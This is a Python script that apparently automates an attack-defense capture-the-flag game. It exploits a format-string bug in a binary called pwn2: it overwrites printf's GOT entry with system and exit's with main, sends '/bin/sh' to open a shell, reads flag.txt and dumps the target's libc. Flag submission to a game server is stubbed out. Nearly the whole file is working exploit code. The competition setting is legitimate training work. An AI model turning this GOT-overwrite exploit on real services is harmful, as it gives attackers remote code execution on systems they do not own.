# coding:utf-8

from ctfbox import *

def get_libc(io):
	io.sendline('cat /lib/libc.so.6')
	buf = io.recv()
	while io.can_recv():
		try:
			buf += io.recv()
		except:
			break
	open('libc.so','wb').write(buf)


# how to pwn this gamebox
def pwn_func(io):
	import libformatstr
	e = ELF('./pwn2')
	# 写入printf.got为system
	argnum = 6
	padding = 0
	p = libformatstr.FormatStr()
	p[e.got['printf']]= e.plt['system']
	p[e.got['exit']] = 0x080485EE # main
	fmt_str = p.payload(argnum, padding, start_len=0) # 0 表示之前打印出的字符
	#log.info('payload:\n %s' % hexdump(fmt_str))

	io.sendline(fmt_str)
	io.recv()
	io.sendline('/bin/sh')
	io.recv()

# how to get flag when you have a shell
def flag_func(io):
	io.sendline('cat flag.txt')
	buf = io.recv()
	flag = re.findall('[0-9a-f]{32}', buf)[0]
	return flag


# how to submit flag to game platform.
def submit_func(flag):
	#cookie =  "PHPSESSID=r1ok5mqncr2dgem41mibqg05l3"
	#r = requests.post('http://192.168.168.102/judgead.php', data={"flag":flag, "number":2}, headers={"Cookie":cookie})
	#succ = 'success' in r.content
	#log.info('submit_function %s', flag)
	succ = True
	return succ


bm = BoxManager()
bm.add('localhost', 8888, pwn_func, flag_func, submit_func)
bm.add('localhost', 8889, pwn_func, flag_func, submit_func)
bm.start()
